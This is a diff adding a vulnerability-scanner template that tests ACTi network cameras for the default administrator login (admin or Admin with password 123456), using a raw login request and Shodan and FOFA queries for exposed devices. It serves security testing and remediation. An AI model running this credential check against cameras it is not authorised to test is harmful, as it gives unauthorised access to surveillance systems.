@@ -1,0 +1,51 @@
+id: acti-web-configurator-default-login
+
+info:
+  name: ACTi Web Configurator - Default Login
+  author: mr-pmillz
+  severity: high
+  description: |
+    ACTi camera Web Configurator accepts default administrator credentials when the factory password has not been changed.
+    This template checks the admin and Admin accounts with the default password 123456.
+  impact: |
+    An attacker can access the camera's administrative interface and view or change camera settings.
+  remediation: |
+    Change the default administrator password and restrict access to the camera's management interface to trusted hosts.
+  reference:
+    - https://download.acti.com/?id=20834
+    - https://download.acti.com/?id=23774
+  classification:
+    cwe-id: CWE-1392
+  metadata:
+    vendor: acti
+    product: camera_firmware
+    shodan-query: 'http.title:"Web Configurator" http.html:"ACTi"'
+    fofa-query: 'app="ACTi-视频监控"'
+  tags: default-login,default-credentials,acti,network-camera,camera,intrusive
+
+http:
+  - raw:
+      - |+
+        GET /cgi-bin/system?USER={{username}}&PWD={{password}}&LOGIN&CHANNEL=1&SYSTEM_INFO HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+        Accept: */*
+        Content-Type: application/x-www-form-urlencoded
+        Cookie: User=; Pwd=
+        Connection: close
+    payloads:
+      username:
+        - admin
+        - Admin
+      password:
+        - "123456"
+    attack: clusterbomb
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "LOGIN='1'"
+      - type: status
+        status:
+          - 200
